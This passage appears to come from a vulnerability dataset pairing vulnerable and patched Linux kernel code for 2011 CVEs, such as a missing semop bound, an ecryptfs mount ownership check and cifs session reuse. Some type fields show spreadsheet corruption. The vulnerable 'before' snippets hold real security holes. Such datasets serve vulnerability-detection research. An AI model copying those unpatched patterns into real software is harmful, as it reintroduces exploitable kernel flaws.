 * Special vmas that are non-mergable, non-mlock()able.
 * Note: mm/huge_memory.c VM_NO_THP depends on this definition.
 */
#define VM_SPECIAL (VM_IO | VM_DONTEXPAND | VM_RESERVED | VM_PFNMAP)

 return ret;
}

#define VM_NO_THP (VM_SPECIAL|VM_INSERTPAGE|VM_MIXEDMAP|VM_SAO| \
		   VM_HUGETLB|VM_SHARED|VM_MAYSHARE)

int hugepage_madvise(struct vm_area_struct *vma,
 unsigned long *vm_flags, int advice)
{
 /*
		 * Be somewhat over-protective like KSM for now!
 */
 if (*vm_flags & (VM_HUGEPAGE | VM_NO_THP))




 return -EINVAL;
		*vm_flags &= ~VM_NOHUGEPAGE;
		*vm_flags |= VM_HUGEPAGE;
 /*
		 * Be somewhat over-protective like KSM for now!
 */
 if (*vm_flags & (VM_NOHUGEPAGE | VM_NO_THP))




 return -EINVAL;
		*vm_flags &= ~VM_HUGEPAGE;
		*vm_flags |= VM_NOHUGEPAGE;
		 * page fault if needed.
 */
 return 0;
 if (vma->vm_ops)
 /* khugepaged not yet working on file or special mappings */
 return 0;
 /*
	 * If is_pfn_mapping() is true is_learn_pfn_mapping() must be
	 * true too, verify it here.
 */
 VM_BUG_ON(is_linear_pfn_mapping(vma) || vma->vm_flags & VM_NO_THP);
	hstart = (vma->vm_start + ~HPAGE_PMD_MASK) & HPAGE_PMD_MASK;
	hend = vma->vm_end & HPAGE_PMD_MASK;
 if (hstart < hend)
	    (vma->vm_flags & VM_NOHUGEPAGE))
 goto out;

 if (!vma->anon_vma || vma->vm_ops)

 goto out;
 if (is_vma_temporary_stack(vma))
 goto out;
 /*
	 * If is_pfn_mapping() is true is_learn_pfn_mapping() must be
	 * true too, verify it here.
 */
 VM_BUG_ON(is_linear_pfn_mapping(vma) || vma->vm_flags & VM_NO_THP);

	pgd = pgd_offset(mm, address);
 if (!pgd_present(*pgd))
			progress++;
 continue;
		}
 if (!vma->anon_vma || vma->vm_ops)

 goto skip;
 if (is_vma_temporary_stack(vma))
 goto skip;
 /*
		 * If is_pfn_mapping() is true is_learn_pfn_mapping()
		 * must be true too, verify it here.
 */
 VM_BUG_ON(is_linear_pfn_mapping(vma) ||
			  vma->vm_flags & VM_NO_THP);

		hstart = (vma->vm_start + ~HPAGE_PMD_MASK) & HPAGE_PMD_MASK;
		hend = vma->vm_end & HPAGE_PMD_MASK;
"
2011,DoS ,CVE-2011-2213,,
2012,#NAME?,CVE-2011-2211," return -EFAULT;

	len = namelen;
 if (namelen > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if (len > count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes < sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;

 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);

 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;

	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"," return -EFAULT;

	len = namelen;
 if (len > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if ((unsigned long)len > (unsigned long)count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes > sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;
 unsigned int status = 0;
 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, (unsigned int __user *) &status, options,
			(struct rusage __user *) &r);
 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;
	err |= put_user(status, ustatus);
	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"
2012,#NAME?,CVE-2011-2210," return -EFAULT;

	len = namelen;
 if (namelen > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if (len > count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes < sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;

 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);

 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;

	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"," return -EFAULT;

	len = namelen;
 if (len > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if ((unsigned long)len > (unsigned long)count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes > sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;
 unsigned int status = 0;
 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, (unsigned int __user *) &status, options,
			(struct rusage __user *) &r);
 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;
	err |= put_user(status, ustatus);
	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"
2012,#NAME?,CVE-2011-2209," return -EFAULT;

	len = namelen;
 if (namelen > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if (len > count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes < sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;

 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);

 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;

	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"," return -EFAULT;

	len = namelen;
 if (len > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if ((unsigned long)len > (unsigned long)count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes > sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;
 unsigned int status = 0;
 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, (unsigned int __user *) &status, options,
			(struct rusage __user *) &r);
 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;
	err |= put_user(status, ustatus);
	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"
2012,#NAME?,CVE-2011-2208," return -EFAULT;

	len = namelen;
 if (namelen > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if (len > count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes < sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;

 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);

 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;

	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"," return -EFAULT;

	len = namelen;
 if (len > 32)
		len = 32;

 down_read(&uts_sem);
 down_read(&uts_sem);
	res = sysinfo_table[offset];
	len = strlen(res)+1;
 if ((unsigned long)len > (unsigned long)count)
		len = count;
 if (copy_to_user(buf, res, len))
		err = -EFAULT;
 return 1;

 case GSI_GET_HWRPB:
 if (nbytes > sizeof(*hwrpb))
 return -EINVAL;
 if (copy_to_user(buffer, hwrpb, nbytes) != 0)
 return -EFAULT;
{
 struct rusage r;
 long ret, err;
 unsigned int status = 0;
 mm_segment_t old_fs;

 if (!ur)
	old_fs = get_fs();

 set_fs (KERNEL_DS);
	ret = sys_wait4(pid, (unsigned int __user *) &status, options,
			(struct rusage __user *) &r);
 set_fs (old_fs);

 if (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))
 return -EFAULT;

	err = 0;
	err |= put_user(status, ustatus);
	err |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);
	err |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);
	err |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);
"
2012,DoS ,CVE-2011-2203,,
2011,DoS ,CVE-2011-2189,,
2011,DoS ,CVE-2011-2184,,
2012,DoS ,CVE-2011-2183,"		slot = list_entry(slot->mm_list.next, struct mm_slot, mm_list);
		ksm_scan.mm_slot = slot;
 spin_unlock(&ksm_mmlist_lock);






next_mm:
		ksm_scan.address = 0;
		ksm_scan.rmap_list = &slot->rmap_list;
","		slot = list_entry(slot->mm_list.next, struct mm_slot, mm_list);
		ksm_scan.mm_slot = slot;
 spin_unlock(&ksm_mmlist_lock);
 /*
		 * Although we tested list_empty() above, a racing __ksm_exit
		 * of the last mm on the list may have removed it since then.
 */
 if (slot == &ksm_mm_head)
 return NULL;
next_mm:
		ksm_scan.address = 0;
		ksm_scan.rmap_list = &slot->rmap_list;
"
2012,Overflow +Priv +Info ,CVE-2011-2182,"
 list_add_tail (&f->list, frags);
found:





 if (f->map & (1 << rec)) {
 ldm_error (""Duplicate VBLK, part %d."", rec);
		f->map &= 0x7F;			/* Mark the group as broken */
","
 list_add_tail (&f->list, frags);
found:
 if (rec >= f->num) {
 ldm_error(""REC value (%d) exceeds NUM value (%d)"", rec, f->num);
 return false;
	}

 if (f->map & (1 << rec)) {
 ldm_error (""Duplicate VBLK, part %d."", rec);
		f->map &= 0x7F;			/* Mark the group as broken */
"
2011,DoS +Priv ,CVE-2011-2022,,
2012,DoS ,CVE-2011-1927,"
 if ((qp->q.last_in & INET_FRAG_FIRST_IN) && qp->q.fragments != NULL) {
 struct sk_buff *head = qp->q.fragments;



 rcu_read_lock();
		head->dev = dev_get_by_index_rcu(net, qp->iif);
 if (!head->dev)
 goto out_rcu_unlock;









 /*
		 * Only search router table for the head fragment,
		 * when defraging timeout at PRE_ROUTING HOOK.
 */
 if (qp->user == IP_DEFRAG_CONNTRACK_IN && !skb_dst(head)) {
 const struct iphdr *iph = ip_hdr(head);
 int err = ip_route_input(head, iph->daddr, iph->saddr,
						 iph->tos, head->dev);
 if (unlikely(err))
 goto out_rcu_unlock;

 /*
			 * Only an end host needs to send an ICMP
			 * ""Fragment Reassembly Timeout"" message, per RFC792.
 */
 if (skb_rtable(head)->rt_type != RTN_LOCAL)
 goto out_rcu_unlock;

		}

 /* Send an ICMP ""Fragment Reassembly Timeout"" message. */
 icmp_send(head, ICMP_TIME_EXCEEDED, ICMP_EXC_FRAGTIME, 0);
","
 if ((qp->q.last_in & INET_FRAG_FIRST_IN) && qp->q.fragments != NULL) {
 struct sk_buff *head = qp->q.fragments;
 const struct iphdr *iph;
 int err;

 rcu_read_lock();
		head->dev = dev_get_by_index_rcu(net, qp->iif);
 if (!head->dev)
 goto out_rcu_unlock;

 /* skb dst is stale, drop it, and perform route lookup again */
 skb_dst_drop(head);
		iph = ip_hdr(head);
		err = ip_route_input_noref(head, iph->daddr, iph->saddr,
					   iph->tos, head->dev);
 if (err)
 goto out_rcu_unlock;

 /*
		 * Only an end host needs to send an ICMP
		 * ""Fragment Reassembly Timeout"" message, per RFC792.
 */
 if (qp->user == IP_DEFRAG_CONNTRACK_IN &&
 skb_rtable(head)->rt_type != RTN_LOCAL)
 goto out_rcu_unlock;













 /* Send an ICMP ""Fragment Reassembly Timeout"" message. */
 icmp_send(head, ICMP_TIME_EXCEEDED, ICMP_EXC_FRAGTIME, 0);
"
2012,Bypass ,CVE-2011-1833,"       ecryptfs_opt_encrypted_view, ecryptfs_opt_fnek_sig,
       ecryptfs_opt_fn_cipher, ecryptfs_opt_fn_cipher_key_bytes,
       ecryptfs_opt_unlink_sigs, ecryptfs_opt_mount_auth_tok_only,

       ecryptfs_opt_err };

static const match_table_t tokens = {
	{ecryptfs_opt_fn_cipher_key_bytes, ""ecryptfs_fn_key_bytes=%u""},
	{ecryptfs_opt_unlink_sigs, ""ecryptfs_unlink_sigs""},
	{ecryptfs_opt_mount_auth_tok_only, ""ecryptfs_mount_auth_tok_only""},

	{ecryptfs_opt_err, NULL}
};

 * ecryptfs_parse_options
 * @sb: The ecryptfs super block
 * @options: The options passed to the kernel

 *
 * Parse mount options:
 * debug=N 	   - ecryptfs_verbosity level for debug output
 *
 * Returns zero on success; non-zero on error
 */
static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options)

{
 char *p;
 int rc = 0;
 char *cipher_key_bytes_src;
 char *fn_cipher_key_bytes_src;



 if (!options) {
		rc = -EINVAL;
 goto out;
			mount_crypt_stat->flags |=
				ECRYPTFS_GLOBAL_MOUNT_AUTH_TOK_ONLY;
 break;



 case ecryptfs_opt_err:
 default:
 printk(KERN_WARNING
 const char *err = ""Getting sb failed"";
 struct inode *inode;
 struct path path;

 int rc;

	sbi = kmem_cache_zalloc(ecryptfs_sb_info_cache, GFP_KERNEL);
 goto out;
	}

	rc = ecryptfs_parse_options(sbi, raw_data);
 if (rc) {
		err = ""Error parsing options"";
 goto out;
 ""known incompatibilities\n"");
 goto out_free;
	}









 ecryptfs_set_superblock_lower(s, path.dentry->d_sb);
	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
","       ecryptfs_opt_encrypted_view, ecryptfs_opt_fnek_sig,
       ecryptfs_opt_fn_cipher, ecryptfs_opt_fn_cipher_key_bytes,
       ecryptfs_opt_unlink_sigs, ecryptfs_opt_mount_auth_tok_only,
       ecryptfs_opt_check_dev_ruid,
       ecryptfs_opt_err };

static const match_table_t tokens = {
	{ecryptfs_opt_fn_cipher_key_bytes, ""ecryptfs_fn_key_bytes=%u""},
	{ecryptfs_opt_unlink_sigs, ""ecryptfs_unlink_sigs""},
	{ecryptfs_opt_mount_auth_tok_only, ""ecryptfs_mount_auth_tok_only""},
	{ecryptfs_opt_check_dev_ruid, ""ecryptfs_check_dev_ruid""},
	{ecryptfs_opt_err, NULL}
};

 * ecryptfs_parse_options
 * @sb: The ecryptfs super block
 * @options: The options passed to the kernel
 * @check_ruid: set to 1 if device uid should be checked against the ruid
 *
 * Parse mount options:
 * debug=N 	   - ecryptfs_verbosity level for debug output
 *
 * Returns zero on success; non-zero on error
 */
static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options,
 uid_t *check_ruid)
{
 char *p;
 int rc = 0;
 char *cipher_key_bytes_src;
 char *fn_cipher_key_bytes_src;

	*check_ruid = 0;

 if (!options) {
		rc = -EINVAL;
 goto out;
			mount_crypt_stat->flags |=
				ECRYPTFS_GLOBAL_MOUNT_AUTH_TOK_ONLY;
 break;
 case ecryptfs_opt_check_dev_ruid:
			*check_ruid = 1;
 break;
 case ecryptfs_opt_err:
 default:
 printk(KERN_WARNING
 const char *err = ""Getting sb failed"";
 struct inode *inode;
 struct path path;
 uid_t check_ruid;
 int rc;

	sbi = kmem_cache_zalloc(ecryptfs_sb_info_cache, GFP_KERNEL);
 goto out;
	}

	rc = ecryptfs_parse_options(sbi, raw_data, &check_ruid);
 if (rc) {
		err = ""Error parsing options"";
 goto out;
 ""known incompatibilities\n"");
 goto out_free;
	}

 if (check_ruid && path.dentry->d_inode->i_uid != current_uid()) {
		rc = -EPERM;
 printk(KERN_ERR ""Mount of device (uid: %d) not owned by ""
 ""requested user (uid: %d)\n"",
		       path.dentry->d_inode->i_uid, current_uid());
 goto out_free;
	}

 ecryptfs_set_superblock_lower(s, path.dentry->d_sb);
	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
"
2011,DoS Overflow +Info ,CVE-2011-1776,,
2011,DoS ,CVE-2011-1771,,
2011,DoS ,CVE-2011-1770,,
2012,DoS ,CVE-2011-1768,"
 printk(banner);

 if (xfrm4_tunnel_register(&ipip_handler, AF_INET)) {





 printk(KERN_INFO ""ipip init: can't register tunnel\n"");
 return -EAGAIN;
	}

	err = register_pernet_device(&ipip_net_ops);
 if (err)
 xfrm4_tunnel_deregister(&ipip_handler, AF_INET);

 return err;
}

{
 int  err;

 if (xfrm6_tunnel_register(&ip4ip6_handler, AF_INET)) {





 printk(KERN_ERR ""ip6_tunnel init: can't register ip4ip6\n"");
		err = -EAGAIN;
 goto out;
	}

 if (xfrm6_tunnel_register(&ip6ip6_handler, AF_INET6)) {

 printk(KERN_ERR ""ip6_tunnel init: can't register ip6ip6\n"");
		err = -EAGAIN;
 goto unreg_ip4ip6;
	}

	err = register_pernet_device(&ip6_tnl_net_ops);
 if (err < 0)
 goto err_pernet;
 return 0;
err_pernet:
 xfrm6_tunnel_deregister(&ip6ip6_handler, AF_INET6);
unreg_ip4ip6:
 xfrm6_tunnel_deregister(&ip4ip6_handler, AF_INET);
out:


 return err;
}


 printk(KERN_INFO ""IPv6 over IPv4 tunneling driver\n"");

 if (xfrm4_tunnel_register(&sit_handler, AF_INET6) < 0) {
 printk(KERN_INFO ""sit init: Can't add protocol\n"");
 return -EAGAIN;
	}

	err = register_pernet_device(&sit_net_ops);
 if (err < 0)
 xfrm4_tunnel_deregister(&sit_handler, AF_INET6);





 return err;
}

 return spi % XFRM6_TUNNEL_SPI_BYSPI_HSIZE;
}


static int __init xfrm6_tunnel_spi_init(void)
{
	xfrm6_tunnel_spi_kmem = kmem_cache_create(""xfrm6_tunnel_spi"",
 sizeof(struct xfrm6_tunnel_spi),
 0, SLAB_HWCACHE_ALIGN,
 NULL);
 if (!xfrm6_tunnel_spi_kmem)
 return -ENOMEM;
 return 0;
}

static void xfrm6_tunnel_spi_fini(void)
{
 kmem_cache_destroy(xfrm6_tunnel_spi_kmem);
}

static struct xfrm6_tunnel_spi *__xfrm6_tunnel_spi_lookup(struct net *net, xfrm_address_t *saddr)
{
 struct xfrm6_tunnel_net *xfrm6_tn = xfrm6_tunnel_pernet(net);
{
 int rv;










	rv = xfrm_register_type(&xfrm6_tunnel_type, AF_INET6);
 if (rv < 0)
 goto err;
	rv = xfrm6_tunnel_register(&xfrm6_tunnel_handler, AF_INET6);
 if (rv < 0)
 goto unreg;
	rv = xfrm6_tunnel_register(&xfrm46_tunnel_handler, AF_INET);
 if (rv < 0)
 goto dereg6;
	rv = xfrm6_tunnel_spi_init();
 if (rv < 0)
 goto dereg46;
	rv = register_pernet_subsys(&xfrm6_tunnel_net_ops);
 if (rv < 0)
 goto deregspi;
 return 0;

deregspi:
 xfrm6_tunnel_spi_fini();
dereg46:
 xfrm6_tunnel_deregister(&xfrm46_tunnel_handler, AF_INET);
dereg6:
 xfrm6_tunnel_deregister(&xfrm6_tunnel_handler, AF_INET6);
unreg:
 xfrm_unregister_type(&xfrm6_tunnel_type, AF_INET6);
err:



 return rv;
}

static void __exit xfrm6_tunnel_fini(void)
{
 unregister_pernet_subsys(&xfrm6_tunnel_net_ops);
 xfrm6_tunnel_spi_fini();
 xfrm6_tunnel_deregister(&xfrm46_tunnel_handler, AF_INET);
 xfrm6_tunnel_deregister(&xfrm6_tunnel_handler, AF_INET6);
 xfrm_unregister_type(&xfrm6_tunnel_type, AF_INET6);


}

module_init(xfrm6_tunnel_init);
","
 printk(banner);

	err = register_pernet_device(&ipip_net_ops);
 if (err < 0)
 return err;
	err = xfrm4_tunnel_register(&ipip_handler, AF_INET);
 if (err < 0) {
 unregister_pernet_device(&ipip_net_ops);
 printk(KERN_INFO ""ipip init: can't register tunnel\n"");

	}





 return err;
}

{
 int  err;

	err = register_pernet_device(&ip6_tnl_net_ops);
 if (err < 0)
 goto out_pernet;

	err = xfrm6_tunnel_register(&ip4ip6_handler, AF_INET);
 if (err < 0) {
 printk(KERN_ERR ""ip6_tunnel init: can't register ip4ip6\n"");
 goto out_ip4ip6;

	}

	err = xfrm6_tunnel_register(&ip6ip6_handler, AF_INET6);
 if (err < 0) {
 printk(KERN_ERR ""ip6_tunnel init: can't register ip6ip6\n"");
 goto out_ip6ip6;

	}




 return 0;

out_ip6ip6:

 xfrm6_tunnel_deregister(&ip4ip6_handler, AF_INET);
out_ip4ip6:
 unregister_pernet_device(&ip6_tnl_net_ops);
out_pernet:
 return err;
}


 printk(KERN_INFO ""IPv6 over IPv4 tunneling driver\n"");






	err = register_pernet_device(&sit_net_ops);
 if (err < 0)
 return err;
	err = xfrm4_tunnel_register(&sit_handler, AF_INET6);
 if (err < 0) {
 unregister_pernet_device(&sit_net_ops);
 printk(KERN_INFO ""sit init: Can't add protocol\n"");
	}
 return err;
}

 return spi % XFRM6_TUNNEL_SPI_BYSPI_HSIZE;
}


















static struct xfrm6_tunnel_spi *__xfrm6_tunnel_spi_lookup(struct net *net, xfrm_address_t *saddr)
{
 struct xfrm6_tunnel_net *xfrm6_tn = xfrm6_tunnel_pernet(net);
{
 int rv;

	xfrm6_tunnel_spi_kmem = kmem_cache_create(""xfrm6_tunnel_spi"",
 sizeof(struct xfrm6_tunnel_spi),
 0, SLAB_HWCACHE_ALIGN,
 NULL);
 if (!xfrm6_tunnel_spi_kmem)
 return -ENOMEM;
	rv = register_pernet_subsys(&xfrm6_tunnel_net_ops);
 if (rv < 0)
 goto out_pernet;
	rv = xfrm_register_type(&xfrm6_tunnel_type, AF_INET6);
 if (rv < 0)
 goto out_type;
	rv = xfrm6_tunnel_register(&xfrm6_tunnel_handler, AF_INET6);
 if (rv < 0)
 goto out_xfrm6;
	rv = xfrm6_tunnel_register(&xfrm46_tunnel_handler, AF_INET);
 if (rv < 0)
 goto out_xfrm46;






 return 0;

out_xfrm46:




 xfrm6_tunnel_deregister(&xfrm6_tunnel_handler, AF_INET6);
out_xfrm6:
 xfrm_unregister_type(&xfrm6_tunnel_type, AF_INET6);
out_type:
 unregister_pernet_subsys(&xfrm6_tunnel_net_ops);
out_pernet:
 kmem_cache_destroy(xfrm6_tunnel_spi_kmem);
 return rv;
}

static void __exit xfrm6_tunnel_fini(void)
{


 xfrm6_tunnel_deregister(&xfrm46_tunnel_handler, AF_INET);
 xfrm6_tunnel_deregister(&xfrm6_tunnel_handler, AF_INET6);
 xfrm_unregister_type(&xfrm6_tunnel_type, AF_INET6);
 unregister_pernet_subsys(&xfrm6_tunnel_net_ops);
 kmem_cache_destroy(xfrm6_tunnel_spi_kmem);
}

module_init(xfrm6_tunnel_init);
"
2012,DoS ,CVE-2011-1767,"
 printk(KERN_INFO ""GRE over IPv4 tunneling driver\n"");

 if (inet_add_protocol(&ipgre_protocol, IPPROTO_GRE) < 0) {
 printk(KERN_INFO ""ipgre init: can't add protocol\n"");
 return -EAGAIN;
	}

	err = register_pernet_device(&ipgre_net_ops);
 if (err < 0)
 goto gen_device_failed;







	err = rtnl_link_register(&ipgre_link_ops);
 if (err < 0)
tap_ops_failed:
 rtnl_link_unregister(&ipgre_link_ops);
rtnl_link_failed:
 unregister_pernet_device(&ipgre_net_ops);
gen_device_failed:
 inet_del_protocol(&ipgre_protocol, IPPROTO_GRE);


 goto out;
}

static void __exit ipgre_fini(void)
{
 rtnl_link_unregister(&ipgre_tap_ops);
 rtnl_link_unregister(&ipgre_link_ops);
 unregister_pernet_device(&ipgre_net_ops);
 if (inet_del_protocol(&ipgre_protocol, IPPROTO_GRE) < 0)
 printk(KERN_INFO ""ipgre close: can't remove protocol\n"");

}

module_init(ipgre_init);
","
 printk(KERN_INFO ""GRE over IPv4 tunneling driver\n"");






	err = register_pernet_device(&ipgre_net_ops);
 if (err < 0)
 return err;

	err = inet_add_protocol(&ipgre_protocol, IPPROTO_GRE);
 if (err < 0) {
 printk(KERN_INFO ""ipgre init: can't add protocol\n"");
 goto add_proto_failed;
	}

	err = rtnl_link_register(&ipgre_link_ops);
 if (err < 0)
tap_ops_failed:
 rtnl_link_unregister(&ipgre_link_ops);
rtnl_link_failed:


 inet_del_protocol(&ipgre_protocol, IPPROTO_GRE);
add_proto_failed:
 unregister_pernet_device(&ipgre_net_ops);
 goto out;
}

static void __exit ipgre_fini(void)
{
 rtnl_link_unregister(&ipgre_tap_ops);
 rtnl_link_unregister(&ipgre_link_ops);

 if (inet_del_protocol(&ipgre_protocol, IPPROTO_GRE) < 0)
 printk(KERN_INFO ""ipgre close: can't remove protocol\n"");
 unregister_pernet_device(&ipgre_net_ops);
}

module_init(ipgre_init);
"
2012,DoS Overflow +Priv Mem. Corr. ,CVE-2011-1759," long err;
 int i;

 if (nsops < 1)
 return -EINVAL;
	sops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);
 if (!sops)
"," long err;
 int i;

 if (nsops < 1 || nsops > SEMOPM)
 return -EINVAL;
	sops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);
 if (!sops)
"
2011,DoS ,CVE-2011-1748,,
2011,DoS ,CVE-2011-1747,,
2011,DoS Overflow ,CVE-2011-1746,,
2011,DoS Overflow +Priv ,CVE-2011-1745,,
2011,DoS ,CVE-2011-1598,,
2011,DoS Overflow ,CVE-2011-1593,,
2013,Bypass ,CVE-2011-1585,"#define MAX_SHARE_SIZE 64 /* used to be 20, this should still be enough */
#define MAX_USERNAME_SIZE 32 /* 32 is to allow for 15 char names + null
				   termination then *2 for unicode versions */
#define MAX_PASSWORD_SIZE 16

#define CIFS_MIN_RCV_POOL 4

}

static struct cifsSesInfo *
cifs_find_smb_ses(struct TCP_Server_Info *server, char *username)
{
 struct list_head *tmp;
 struct cifsSesInfo *ses;

 write_lock(&cifs_tcp_ses_lock);
 list_for_each(tmp, &server->smb_ses_list) {
		ses = list_entry(tmp, struct cifsSesInfo, smb_ses_list);
 if (strncmp(ses->userName, username, MAX_USERNAME_SIZE))
 continue;












		++ses->ses_count;
 write_unlock(&cifs_tcp_ses_lock);
 return ses;

	xid = GetXid();

	ses = cifs_find_smb_ses(server, volume_info->username);
 if (ses) {
 cFYI(1, ""Existing smb sess found (status=%d)"", ses->status);

","#define MAX_SHARE_SIZE 64 /* used to be 20, this should still be enough */
#define MAX_USERNAME_SIZE 32 /* 32 is to allow for 15 char names + null
				   termination then *2 for unicode versions */
#define MAX_PASSWORD_SIZE 512 /* max for windows seems to be 256 wide chars */

#define CIFS_MIN_RCV_POOL 4

}

static struct cifsSesInfo *
cifs_find_smb_ses(struct TCP_Server_Info *server, struct smb_vol *vol)
{

 struct cifsSesInfo *ses;

 write_lock(&cifs_tcp_ses_lock);
 list_for_each_entry(ses, &server->smb_ses_list, smb_ses_list) {
 switch (server->secType) {
 case Kerberos:
 if (vol->linux_uid != ses->linux_uid)
 continue;
 break;
 default:
 /* anything else takes username/password */
 if (strncmp(ses->userName, vol->username,
				    MAX_USERNAME_SIZE))
 continue;
 if (strlen(vol->username) != 0 &&
 strncmp(ses->password, vol->password,
				    MAX_PASSWORD_SIZE))
 continue;
		}
		++ses->ses_count;
 write_unlock(&cifs_tcp_ses_lock);
 return ses;

	xid = GetXid();

	ses = cifs_find_smb_ses(server, volume_info);
 if (ses) {
